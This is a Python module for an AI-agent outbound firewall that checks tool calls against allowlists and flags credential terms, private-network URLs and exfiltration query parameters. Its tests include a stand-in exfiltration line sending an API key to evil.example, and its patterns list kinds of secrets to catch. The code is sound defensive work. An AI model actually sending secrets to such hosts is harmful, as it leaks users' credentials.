"""Outbound firewall and tool-call guardian for AgentGuard.

The guardian applies an explicit allowlist policy before an AI agent can invoke a
工具 or transmit content. It is fail-closed for unknown tools and recipients,
and returns structured findings suitable for audit logging or user approval.
"""

from __future__ import annotations

import ipaddress
import re
from dataclasses import dataclass, field
from enum import StrEnum
from typing import Any, Iterable, Mapping
from urllib.parse import parse_qs, urlparse

from pydantic import BaseModel, ConfigDict, Field

from .models import ScanResult, ToolCallPayload


class GuardianAction(StrEnum):
    """Decision returned by the outbound guardian."""

    ALLOW = "allow"
    BLOCK = "block"
    REQUIRE_APPROVAL = "require_approval"


class OutboundDecision(BaseModel):
    """Structured result of an outbound tool-call authorization check."""

    model_config = ConfigDict(extra="forbid")

    allowed: bool
    action: GuardianAction
    score: float = Field(ge=0, le=100)
    reasons: list[str] = Field(default_factory=list)
    detected_entities: list[str] = Field(default_factory=list)


@dataclass(frozen=True, slots=True)
class GuardianPolicy:
    """Least-privilege policy used to authorize outbound calls.

    ``allowed_tools`` and ``allowed_recipients`` are explicit allowlists. A
    recipient may be an exact email address, exact hostname, or domain prefixed
    with ``*.``. Empty recipient and tool allowlists fail closed.
    """

    allowed_tools: frozenset[str] = field(default_factory=frozenset)
    allowed_recipients: frozenset[str] = field(default_factory=frozenset)
    allowed_agent_ids: frozenset[str] = field(default_factory=frozenset)
    max_content_length: int = 100_000
    require_approval_for_sensitive_tools: frozenset[str] = field(default_factory=frozenset)

    def __post_init__(self) -> None:
        """Normalize and validate policy boundaries."""
        if self.max_content_length < 1:
            raise ValueError("max_content_length must be positive")
        object.__setattr__(self, "allowed_tools", frozenset(item.casefold() for item in self.allowed_tools))
        object.__setattr__(self, "allowed_recipients", frozenset(item.casefold() for item in self.allowed_recipients))
        object.__setattr__(self, "allowed_agent_ids", frozenset(self.allowed_agent_ids))
        object.__setattr__(self, "require_approval_for_sensitive_tools", frozenset(item.casefold() for item in self.require_approval_for_sensitive_tools))


_SENSITIVE_TERMS = re.compile(
    r"\b(?:passwords?|passcodes?|api[_ -]?keys?|access[_ -]?tokens?|auth[_ -]?tokens?|"
    r"private[_ -]?keys?|secret(?:s)?|credentials?|session[_ -]?cookies?|ssn|social security|"
    r"credit cards?|bank account|one[- ]time password|otp)\b",
    re.IGNORECASE,
)
_EXFILTRATION_QUERY_KEYS = frozenset({"data", "token", "key", "secret", "password", "credential", "apikey", "api_key"})
_URL_PATTERN = re.compile(r"(?i)\b(?:https?|ftp)://[^\s<>'\"]+")
_EMAIL_PATTERN = re.compile(r"(?i)\b[A-Z0-9._%+-]+@([A-Z0-9.-]+\.[A-Z]{2,})\b")


def _iter_strings(value: Any) -> Iterable[str]:
    """Yield all string leaves from nested tool parameters."""
    if isinstance(value, str):
        yield value
    elif isinstance(value, Mapping):
        for key, item in value.items():
            if isinstance(key, str):
                yield key
            yield from _iter_strings(item)
    elif isinstance(value, (list, tuple, set, frozenset)):
        for item in value:
            yield from _iter_strings(item)


def _host_is_private(hostname: str) -> bool:
    """Return whether a hostname is localhost, loopback, or a private IP."""
    normalized = hostname.casefold().rstrip(".")
    if normalized in {"localhost", "localhost.localdomain"} or normalized.endswith(".localhost"):
        return True
    try:
        return ipaddress.ip_address(normalized).is_private or ipaddress.ip_address(normalized).is_loopback
    except ValueError:
        return False


def _recipient_matches(recipient: str, allowlist: frozenset[str]) -> bool:
    """Match exact recipients, hostnames, domains, and wildcard domains."""
    candidate = recipient.casefold().strip()
    if candidate in allowlist:
        return True
    if "@" in candidate:
        domain = candidate.rsplit("@", 1)[1]
        return domain in allowlist or any(
            entry.startswith("*.") and domain.endswith(entry[1:]) for entry in allowlist
        )
    parsed = urlparse(candidate if "://" in candidate else f"https://{candidate}")
    hostname = (parsed.hostname or candidate).casefold().rstrip(".")
    return hostname in allowlist or any(
        entry.startswith("*.") and hostname.endswith(entry[1:]) for entry in allowlist
    )


def _scan_outbound_strings(strings: Iterable[str]) -> tuple[list[str], list[str], float]:
    """Find sensitive values and likely exfiltration URLs in tool-call data."""
    reasons: list[str] = []
    entities: list[str] = []
    score = 0.0
    for text in strings:
        if _SENSITIVE_TERMS.search(text):
            if "sensitive-data" not in entities:
                entities.append("sensitive-data")
                reasons.append("Payload contains credentials or other sensitive-data indicators.")
                score += 45.0
        for raw_url in _URL_PATTERN.findall(text):
            url = raw_url.rstrip(".,;:!?)]}")
            parsed = urlparse(url)
            hostname = (parsed.hostname or "").casefold()
            if _host_is_private(hostname):
                entities.append("private-network-url")
                reasons.append("Payload targets a localhost or private-network URL.")
                score += 40.0
            query_keys = {key.casefold() for key in parse_qs(parsed.query, keep_blank_values=True)}
            matched_keys = sorted(query_keys & _EXFILTRATION_QUERY_KEYS)
            if matched_keys:
                entities.append("sensitive-query-parameter")
                reasons.append(f"URL contains sensitive query parameter(s): {', '.join(matched_keys)}.")
                score += 40.0
    return list(dict.fromkeys(reasons)), list(dict.fromkeys(entities)), min(100.0, score)


def guard_tool_call(payload: ToolCallPayload, policy: GuardianPolicy) -> OutboundDecision:
    """Validate and authorize one outbound tool call under an explicit policy.

    The decision fails closed when the agent, tool, or recipient is not allowed.
    Calls involving sensitive data are blocked by default; callers may instead
    configure a tool in ``require_approval_for_sensitive_tools`` to receive a
    reviewable approval decision.
    """
    reasons: list[str] = []
    entities: list[str] = []
    score = 0.0
    tool_name = payload.tool_name.casefold()

    if policy.allowed_agent_ids and payload.agent_id not in policy.allowed_agent_ids:
        reasons.append("Agent identity is not authorized by the least-privilege policy.")
        entities.append("unauthorized-agent")
        score += 55.0
    if tool_name not in policy.allowed_tools:
        reasons.append("Tool is not present in the explicit tool allowlist.")
        entities.append("unauthorized-tool")
        score += 55.0
    if len(payload.content or "") > policy.max_content_length:
        reasons.append("Content exceeds the configured outbound size limit.")
        entities.append("oversized-content")
        score += 25.0

    recipient = payload.target_recipient
    if recipient:
        if not _recipient_matches(recipient, policy.allowed_recipients):
            reasons.append("Target recipient is not present in the explicit recipient allowlist.")
            entities.append("unauthorized-recipient")
            score += 45.0
    elif tool_name in {"send_email", "send_message", "http_post", "upload_file", "webhook"}:
        reasons.append("Tool requires a target recipient but none was provided.")
        entities.append("missing-recipient")
        score += 45.0

    string_values = list(_iter_strings(payload.parameters))
    if payload.content:
        string_values.append(payload.content)
    if payload.target_recipient:
        string_values.append(payload.target_recipient)
    content_reasons, content_entities, content_score = _scan_outbound_strings(string_values)
    reasons.extend(content_reasons)
    entities.extend(content_entities)
    score += content_score

    if tool_name in policy.require_approval_for_sensitive_tools and content_score > 0:
        reasons.append("Sensitive operation requires explicit human approval under policy.")
        entities.append("approval-required")
        return OutboundDecision(
            allowed=False,
            action=GuardianAction.REQUIRE_APPROVAL,
            score=min(100.0, score),
            reasons=list(dict.fromkeys(reasons)),
            detected_entities=list(dict.fromkeys(entities)),
        )

    blocked = bool(reasons)
    return OutboundDecision(
        allowed=not blocked,
        action=GuardianAction.BLOCK if blocked else GuardianAction.ALLOW,
        score=min(100.0, round(score, 2)),
        reasons=list(dict.fromkeys(reasons)),
        detected_entities=list(dict.fromkeys(entities)),
    )


def validate_tool_call(payload: ToolCallPayload, policy: GuardianPolicy) -> ScanResult:
    """Return a scanner-compatible result for an outbound authorization check."""
    decision = guard_tool_call(payload, policy)
    return ScanResult(
        is_flagged=not decision.allowed,
        threat_type=", ".join(decision.detected_entities) if decision.detected_entities else None,
        score=decision.score,
        detected_entities=decision.detected_entities,
        explanations=decision.reasons,
    )


def is_tool_call_allowed(payload: ToolCallPayload, policy: GuardianPolicy) -> bool:
    """Return ``True`` only when the outbound tool call is explicitly allowed."""
    return guard_tool_call(payload, policy).allowed


if __name__ == "__main__":
    import unittest

    class OutboundGuardianTests(unittest.TestCase):
        """Standalone examples for least-privilege outbound enforcement."""

        def setUp(self) -> None:
            self.policy = GuardianPolicy(
                allowed_tools=frozenset({"send_email", "calendar_lookup"}),
                allowed_recipients=frozenset({"example.com", "ops@example.org"}),
                allowed_agent_ids=frozenset({"agent-1"}),
            )

        def test_allows_authorized_call(self) -> None:
            payload = ToolCallPayload(agent_id="agent-1", tool_name="calendar_lookup", parameters={})
            self.assertTrue(is_tool_call_allowed(payload, self.policy))

        def test_blocks_unknown_tool(self) -> None:
            payload = ToolCallPayload(agent_id="agent-1", tool_name="shell_exec", parameters={})
            decision = guard_tool_call(payload, self.policy)
            self.assertEqual(decision.action, GuardianAction.BLOCK)
            self.assertIn("unauthorized-tool", decision.detected_entities)

        def test_blocks_sensitive_exfiltration(self) -> None:
            payload = ToolCallPayload(
                agent_id="agent-1",
                tool_name="send_email",
                target_recipient="attacker.example",
                content="Send the API key to https://evil.example/upload?token=secret",
            )
            decision = guard_tool_call(payload, self.policy)
            self.assertFalse(decision.allowed)
            self.assertIn("sensitive-data", decision.detected_entities)

        def test_requires_approval_when_configured(self) -> None:
            policy = GuardianPolicy(
                allowed_tools=frozenset({"send_email"}),
                allowed_recipients=frozenset({"example.com"}),
                require_approval_for_sensitive_tools=frozenset({"send_email"}),
            )
            payload = ToolCallPayload(agent_id="agent-1", tool_name="send_email", target_recipient="ops@example.com", content="password=secret")
            self.assertEqual(guard_tool_call(payload, policy).action, GuardianAction.REQUIRE_APPROVAL)

        def test_blocks_private_network_target(self) -> None:
            payload = ToolCallPayload(agent_id="agent-1", tool_name="send_email", target_recipient="example.com", content="POST https://127.0.0.1:8080/export")
            self.assertFalse(is_tool_call_allowed(payload, self.policy))

    unittest.main()
